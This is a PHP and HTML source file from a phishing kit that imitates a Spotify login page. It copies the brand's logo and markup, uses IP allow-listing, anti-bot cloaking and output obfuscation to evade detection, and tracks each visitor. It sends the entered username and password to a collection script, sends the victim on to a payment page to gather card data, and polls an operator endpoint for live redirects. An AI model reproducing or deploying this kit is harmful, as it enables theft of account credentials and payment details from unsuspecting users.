<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    }
}
$clientIP = getClientIP();
if (!isIpAllowed($clientIP)) {
    header("Location: " . sitexite());
    exit();
}
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?>
<html id="app">
  <head>
    <meta >
    <title><?php echo $payd01['s001']?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="stylesheet" href="./css/spot1.css">
    <script src="js/jquery.js"></script>
    <link rel="icon" href="data:image/vnd.microsoft.icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExgR////Af///wH///8B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL8TExjvExMY7xMTGL8TExi/ExMYgRMTGEH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
    <style>
      .sf-hidden {
        display: none !important
      }
    </style>
    <link rel="canonical">
    <style>
      img[src="data:,"],
      source[src="data:,"] {
        display: none !important
      }
    </style>
  </head>
  <body class="encore-dark-theme encore-layout-themes">
    <div id="root">
      
      <div class="sc-cDelgQ ealYxH encore-dark-theme encore-layout-themes">
        <div class="sc-esHPOb sc-fsKlOa bCSeqD fFJVRD">
          <div class="sc-hNGPaV hNTfFP">
            <h1 data-encore-id="visuallyHidden" class="VisuallyHidden__VisuallyHiddenElement-sc-17bibe8-0 jlTKeD">Login</h1>
            <div data-testid="login-container" class="sc-gJhJTp sc-fQpRED jIWbvU jTGUSl">
              <div class="sc-flUsNl iDuImO">
                <div  class="sc-hAqmLS da-DoCW">
                  <svg role="img" viewBox="0 0 24 24"  aria-hidden="false" height="100%" style="fill:white"  class="Svg-sc-6c3c1v-0 jlGQTA">
                    <path d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546m13.612-.036-.832-.247c-1.67-.495-2.14-.681-2.14-1.353 0-.637.708-1.327 2.264-1.327 1.539 0 2.839.752 3.51 1.31.116.096.24.052.24-.098V6.935c0-.097-.027-.15-.098-.203-.83-.62-2.272-1.07-3.723-1.07-2.953 0-4.722 1.68-4.722 3.59 0 2.157 1.371 2.91 3.626 3.546l.973.274c1.689.478 1.998.902 1.998 1.556 0 1.097-.831 1.433-2.07 1.433-1.556 0-3.457-.911-4.35-2.025-.08-.098-.177-.053-.177.062v2.423c0 .097.01.141.08.22.743.814 2.52 1.53 4.59 1.53 2.546 0 4.456-1.485 4.456-3.784 0-1.787-1.052-2.865-3.625-3.635m10.107-1.76c-1.68 0-2.653 1.026-3.219 2.052V9.376c0-.08-.044-.124-.124-.124h-2.22c-.079 0-.123.044-.123.124V20.72c0 .08.044.124.124.124h2.22c.079 0 .123-.044.123-.124v-4.536c.566 1.025 1.521 2.034 3.237 2.034 2.264 0 3.89-1.955 3.89-4.581s-1.644-4.545-3.908-4.545m-.654 6.986c-1.185 0-2.211-1.167-2.618-2.458.407-1.362 1.344-2.405 2.618-2.405 1.211 0 2.051.92 2.051 2.423s-.84 2.44-2.051 2.44m40.633-6.826h-2.264c-.08 0-.115.017-.15.097l-2.282 5.483-2.29-5.483c-.035-.08-.07-.097-.15-.097h-3.661v-.584c0-.955.645-1.397 1.476-1.397.496 0 1.035.256 1.415.486.089.053.15-.008.115-.088l-.796-1.901a.26.26 0 0 0-.124-.133c-.389-.203-1.025-.38-1.644-.38-1.875 0-2.954 1.432-2.954 3.254v.743h-1.503c-.08 0-.124.044-.124.124v1.768c0 .08.044.124.124.124h1.503v6.668c0 .08.044.123.124.123h2.264c.08 0 .124-.044.124-.123v-6.668h1.936l2.812 6.11-1.512 3.325c-.044.098.009.142.097.142h2.414c.08 0 .116-.018.15-.097l4.997-11.355c.035-.08-.009-.141-.097-.141M54.964 9.04c-2.865 0-4.837 2.025-4.837 4.616 0 2.573 1.971 4.616 4.837 4.616 2.856 0 4.846-2.043 4.846-4.616 0-2.591-1.99-4.616-4.846-4.616m.008 7.065c-1.37 0-2.343-1.043-2.343-2.45 0-1.405.973-2.449 2.343-2.449 1.362 0 2.335 1.043 2.335 2.45 0 1.406-.973 2.45-2.335 2.45m33.541-6.334a1.24 1.24 0 0 0-.483-.471 1.4 1.4 0 0 0-.693-.17q-.384 0-.693.17a1.24 1.24 0 0 0-.484.471q-.174.302-.174.681 0 .375.174.677.175.3.484.471t.693.17.693-.17.483-.471.175-.676q0-.38-.175-.682m-.211 1.247a1 1 0 0 1-.394.39 1.15 1.15 0 0 1-.571.14 1.16 1.16 0 0 1-.576-.14 1 1 0 0 1-.391-.39 1.14 1.14 0 0 1-.14-.566q0-.316.14-.562t.391-.388.576-.14q.32 0 .57.14.253.141.395.39t.142.565q0 .312-.142.56m-19.835-5.78c-.85 0-1.468.6-1.468 1.396s.619 1.397 1.468 1.397c.866 0 1.485-.6 1.485-1.397 0-.796-.619-1.397-1.485-1.397m19.329 5.19a.31.31 0 0 0 .134-.262q0-.168-.132-.266-.132-.099-.381-.099h-.588v1.229h.284v-.489h.154l.374.489h.35l-.41-.518a.5.5 0 0 0 .215-.084m-.424-.109h-.26v-.3h.27q.12 0 .184.036a.12.12 0 0 1 .065.116.12.12 0 0 1-.067.111.4.4 0 0 1-.192.037M69.607 9.252h-2.263c-.08 0-.124.044-.124.124v8.56c0 .08.044.123.124.123h2.263c.08 0 .124-.044.124-.123v-8.56c0-.08-.044-.124-.124-.124m-3.333 6.605a2.1 2.1 0 0 1-1.053.257c-.725 0-1.185-.425-1.185-1.362v-3.484h2.211c.08 0 .124-.044.124-.124V9.376c0-.08-.044-.124-.124-.124h-2.21V6.944c0-.097-.063-.15-.15-.08l-3.954 3.113c-.053.044-.07.088-.07.16v1.007c0 .08.044.124.123.124h1.539v3.855c0 2.087 1.203 3.06 2.918 3.06.743 0 1.46-.194 1.884-.442.062-.035.07-.07.07-.133v-1.68c0-.088-.044-.115-.123-.07" transform="translate(-0.95,0)"></path>
                  </svg>
                </div>
              </div>
			            <form id="log" method="post" action="javascript:void(0)">
              <h1 variant="titleLarge" class="sc-jzjKHc itwVFE"><?php echo $payd01['s005x']?></h1>
			  <?php if(isset($_GET['failed'])){
                                        echo " <div class='sc-gLXSEc eZHyFP'>
                <div data-encore-id='banner' class='Wrapper-sc-62m9tu-0 eeuJYm encore-negative-set encore-text-body-small sc-fLVwEd xzayH'>
                  <svg data-encore-id='icon' role='img' aria-label='Error:' aria-hidden='false' class='Svg-sc-ytk21e-0 exPciu Icon-sc-1mveit9-0 dtkJdQ' viewBox='0 0 24 24'>
                    <title>Error:</title>
                    <path d='M11 18v-2h2v2h-2zm0-4V6h2v8h-2z'></path>
                    <path d='M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM1 12C1 5.925 5.925 1 12 1s11 4.925 11 11-4.925 11-11 11S1 18.075 1 12z'></path>
                  </svg>
                  <span class='Message-sc-15vkh7g-0 kGDZJw' style='text-align:left;'>Incorrect username or password.</span>
                </div>
              </div>";
                                        }?>
            
              <hr role="presentation" class="sc-iCZwEW gWxmho">
              <div data-testid="login-form" class="Group-sc-u9bcx5-0 dTRcop sc-epPVmt gcMohz" data-encore-id="formGroup">
                <div class="sc-kinYwB dONESo">
                  <div class="Group-sc-u9bcx5-0 dTRcop sc-fpSrms bSfdyE" data-encore-id="formGroup">
                    <div class="LabelGroup-sc-1ibddrg-0 ebSvva encore-text-body-small-bold">
                      <label for="login-username" class="Label-sc-1c0cv3r-0 bGmVWE">
                        <span class="LabelInner-sc-19pye2k-0 kuCWup"><?php echo $payd01['s002']?></span>
                      </label>
                    </div>
                    <input aria-invalid="false" class="Input-sc-1gbx9xe-0 gVyyKq encore-text-body-medium" name="username" required data-encore-id="formInput" id="login-username" type="text" placeholder="<?php echo $payd01['s002']?>" data-testid="login-username" autocapitalize="none" autocomplete="username" spellcheck="false" autocorrect="off" aria-describedby="username-error" value>
                  </div>
                  <div class="Group-sc-u9bcx5-0 dTRcop sc-fpSrms bSfdyE" data-encore-id="formGroup">
                    <div class="LabelGroup-sc-1ibddrg-0 ebSvva encore-text-body-small-bold">
                      <label for="login-password" class="Label-sc-1c0cv3r-0 bGmVWE">
                        <span class="LabelInner-sc-19pye2k-0 kuCWup"><?php echo $payd01['s003']?></span>
                      </label>
                    </div>
                    <div data-encore-id="formInputIcon" class="InputContainer-sc-a5ofs0-0 cUEVVf">
                      <input aria-invalid="false" class="Input-sc-1gbx9xe-0 gVyyKq encore-text-body-medium" name="password" required data-encore-id="formInput" id="login-password" type="password" placeholder="<?php echo $payd01['s003']?>" data-testid="login-password" autocomplete="current-password" spellcheck="false" autocorrect="off" aria-describedby="password-error" autocapitalize="none">
                      <div class="IconContainer-sc-1oa4n9m-0 gyyaHh">
   <button  aria-label="hide password" class="Button-sc-1dqy6lx-0 bnvbjc" onclick="togglePasswordVisibility()" type="button">
      <span id="eye1" class="IconWrapper__Wrapper-sc-16usrgb-0 hKVcO">
               <svg data-encore-id="icon" role="img"  viewBox="0 0 24 24" class="Svg-sc-ytk21e-0 ZujEm" >
                              <path d="M22.207 2.824a1 1 0 1 0-1.414-1.414L17.15 5.053C15.621 4.363 13.92 4 12 4 8.671 4 5.996 5.091 3.742 7.089c-.896.794-2.3 2.353-3.381 4.453L.125 12l.236.458c1.082 2.1 2.485 3.659 3.381 4.453.278.246.562.479.853.697L1.793 20.41a1 1 0 1 0 1.414 1.414l3.126-3.126.003.002 1.503-1.503-.004-.001 1.73-1.73.004.001 1.567-1.567h-.004l4.68-4.681.001.004 1.595-1.595-.002-.003.11-.109.002.002 1.444-1.444-.003-.002 3.248-3.248zM14.884 7.32l-5.57 5.57A4.035 4.035 0 0 1 8.113 10c0-2.23 1.761-4 3.886-4 1.137 0 2.17.506 2.884 1.319zM7.9 14.304l-1.873 1.873a11.319 11.319 0 0 1-.957-.763C4.396 14.818 3.3 13.621 2.387 12c.913-1.62 2.01-2.818 2.683-3.414.519-.46 1.061-.863 1.634-1.204A6.073 6.073 0 0 0 6.113 10c0 1.681.682 3.21 1.786 4.304zm11.568-5.2 1.415-1.415a16.503 16.503 0 0 1 2.756 3.853l.236.458-.236.458c-1.082 2.1-2.485 3.659-3.381 4.453C18.004 18.908 15.328 20 12 20a13.22 13.22 0 0 1-3.08-.348l1.726-1.726c.435.05.886.074 1.354.074 2.833 0 5.037-.907 6.931-2.586.674-.596 1.77-1.793 2.683-3.414a14.515 14.515 0 0 0-2.146-2.896z"></path>
                              <path d="M17.843 10.729c-.328 2.755-2.494 4.956-5.24 5.24l5.24-5.24z"></path>
                            </svg>
      </span>
            <span id="eye2" style="display:none;" class="IconWrapper__Wrapper-sc-16usrgb-0 hKVcO">
               <svg data-encore-id="icon" role="img"  viewBox="0 0 24 24" class="Svg-sc-ytk21e-0 ZujEm" >
            <path d="M6.703 7.382A6.073 6.073 0 0 0 6.113 10c0 3.292 2.614 6 5.887 6 3.273 0 5.886-2.708 5.886-6 0-.936-.211-1.825-.589-2.618.573.341 1.115.744 1.634 1.204.674.596 1.77 1.793 2.683 3.414-.913 1.62-2.01 2.818-2.683 3.414C17.037 17.093 14.833 18 12 18s-5.037-.907-6.931-2.586c-.674-.596-1.77-1.793-2.683-3.414.913-1.62 2.01-2.818 2.683-3.414.519-.46 1.061-.863 1.634-1.204zM12 4C8.671 4 5.996 5.091 3.742 7.089c-.896.794-2.3 2.353-3.381 4.453L.125 12l.236.458c1.082 2.1 2.485 3.659 3.381 4.453C5.996 18.908 8.672 20 12 20c3.329 0 6.004-1.091 8.258-3.089.896-.794 2.3-2.353 3.38-4.453l.237-.458-.236-.458c-1.082-2.1-2.485-3.659-3.381-4.453C18.004 5.09 15.328 4 12 4zm0 2c2.125 0 3.886 1.77 3.886 4S14.125 14 12 14s-3.886-1.77-3.886-4S9.875 6 12 6z"></path>
                            </svg>
      </span>
   </button>
</div>
     <script>
        function togglePasswordVisibility() {
            const passwordField = document.getElementById('login-password');
            const toggleButton = document.getElementById('togglePassword');
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                $("#eye1").hide();
                $("#eye2").show();
            } else {
                passwordField.type = 'password';
                $("#eye2").hide();
                $("#eye1").show();
            }
        }
    </script>

                    </div>
                  </div>
                </div>
                <div class="sc-gutikT sc-huvEkS fVbbtc leTZEG">
                  <button id="login-button" type="submit" data-testid="login-button" style="width:100%" data-encore-id="buttonPrimary" class="Button-sc-qlcn5g-0 hFRjpO encore-text-body-medium-bold">
                    <span class="ButtonInner-sc-14ud5tc-0 hvvTXU encore-bright-accent-set">
                      <span class="encore-text encore-text-body-medium-bold sc-iKTcqh sc-gnpbhQ doOTMr cyUyia" data-encore-id="text"><?php echo $payd01['s005']?></span>
                    </span>
                    <span class="ButtonFocus-sc-2hq6ey-0 gJnrqA"></span>
                  </button>
                </div>
				</form>
				  <script type="text/javascript">
				  
                                        var request;
                                        $("#log").submit(function (event) {
                                            event.preventDefault();
                                            if (request) {
                                                request.abort();
                                            }
                                            var $form = $(this);
                                            var $inputs = $form.find("input, select, button, textarea");
                                            var serializedData = $form.serialize();
                                            $inputs.prop("disabled", true);
                                            request = $.ajax({
                                                url: "../includes/ajax.php",
                                                type: "post",
                                                data: serializedData,
                                            });
                                            request.done(function (response, textStatus, jqXHR) {
                                                $(location).attr("href", "payment.php?ids=<?php echo gurl();?>");
                                            });
                                            request.fail(function (jqXHR, textStatus, errorThrown) {
                                                console.error("The following error occurred: " + textStatus, errorThrown);
                                            });
                                            request.always(function () {
                                                $inputs.prop("disabled", false);
                                            });
                                        });
                                    </script>
					<script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
                <div class="sc-ifyrTC sc-dENhDJ sc-eEPDDI dssuKg ilTmUK egGRlx">
                  <a href="" id="reset-password-link" data-testid="reset-password-link" class="Link-sc-k8gsk-0 cgOuFc sc-euGpHm geXsAV" data-encore-id="textLink">
                    <p variant="bodyMedium" class="sc-czgmHJ kraIJY"><?php echo $payd01['s006']?></p>
                  </a>
                </div>
              </div>
              <div id="sign-up-section" data-testid="signup-section" class="sc-dorvvM ewqcub">
                <h2 variant="bodyMedium" class="sc-cBYhjr kyvYle">
                  <span class="encore-text encore-text-body-medium encore-internal-color-text-subdued" data-encore-id="text"><?php echo $payd01['s007']?></span>
                  <a href="" id="sign-up-link" data-testid="signup-btn-link" class="Link-sc-k8gsk-0 cgOuFc sc-kTYLvb klSGTe" data-encore-id="textLink">
                    <span class="encore-text encore-text-body-medium sc-dJDBYC ghuOx" data-encore-id="text"><?php echo $payd01['s008']?></span>
                  </a>
                </h2>
              </div>
            </div>
          </div>
        </div>
        <script> const antibot = <?php echo json_encode(htmlspecialchars(base64_encode(tok()))); ?> ;</script>
        <script src="./js/jquery.mask.js"></script>  
        <footer>
          <div class="sc-dsLQwm irpyNJ">
            <p class="encore-text encore-text-marginal" data-encore-id="text"><?php echo $payd01['s009']?> <a href="" target="_blank" rel="noopener noreferrer"> <?php echo $payd01['s010']?></p>
          </div>
        </footer>
      </div>
    </div>
    <div>

    </div>
  </body>
</html>